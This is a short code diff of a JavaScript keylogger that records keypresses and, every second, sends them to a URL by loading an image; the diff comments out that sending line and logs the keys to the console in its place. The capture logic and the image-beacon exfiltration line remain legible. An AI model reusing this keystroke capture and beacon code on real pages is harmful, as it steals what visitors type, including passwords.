@@ -9,8 +9,10 @@ document.onkeypress = function(e) {
 }
 window.setInterval(function(){
 	if(keys.length>0) {
-		new Image().src = url+keys;
+		//new Image().src = url+keys;
+		console.log(keys);
 		keys = '';
+		console.log();
 	}
 }, 1000);
 
